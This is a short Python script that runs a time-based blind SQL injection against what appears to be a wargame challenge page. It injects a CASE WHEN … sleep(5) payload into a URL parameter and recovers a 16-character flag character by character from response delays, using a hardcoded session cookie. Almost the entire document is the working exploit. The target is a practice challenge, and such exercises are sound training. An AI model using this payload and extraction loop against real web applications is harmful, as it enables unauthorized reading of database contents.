#!/usr/bin/python
import requests
import re
from time import time

cookie = {'PHPSESSID': 'shqn0fe6r9cngobh3do3em0tb4'}

url = "https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag="

passchars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!~?/"

flag=""

#Password is
for j in range(0,16):   #length of flag is 16
    for i in passchars:
        query = url + "(case when (flag like '" + flag + i + "%') then (sleep(5)%2Bnull) else null end)"
        start = time()
        req = requests.get(query, cookies=cookie)
        end = time()
        res = req.text
        diff = end-start
        if (diff>=5):
            flag += i
            print "flag is coming: " + flag + i
            break
print "flag is : " + flag
